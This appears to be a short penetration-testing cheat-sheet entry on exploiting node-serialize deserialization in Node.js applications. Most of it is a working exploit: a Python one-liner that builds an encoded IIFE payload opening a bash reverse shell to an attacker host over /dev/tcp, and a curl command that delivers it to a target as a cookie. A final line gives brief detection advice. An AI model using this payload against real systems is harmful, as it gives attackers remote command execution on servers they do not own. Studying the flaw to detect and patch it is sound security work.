# Node.js Deserialization RCE (node-serialize)

`node-serialize` passes objects through `eval()`. If a serialized cookie or parameter contains an IIFE (Immediately Invoked Function Expression), it executes on deserialization.

```bash
# Craft payload (nodejsshell.py or manual):
# Wrap reverse shell in IIFE: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('cmd',cb)}()"}

# Base64 encode for cookie injection:
python3 -c "
import base64, json
payload = {'username': '_\$\$ND_FUNC\$\$_function (){require(\'child_process\').exec(\'bash -c \\\"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\\\"\',function(error,stdout,stderr){console.log(stdout)});}()'}
print(base64.b64encode(json.dumps(payload).encode()).decode())
"

# Set as cookie and send request
curl -s http://<TARGET>/ -H "Cookie: profile=<B64_PAYLOAD>"
```

Detection: `node-serialize` in `package.json` dependencies. Check cookie/parameter handling for `unserialize()` calls.
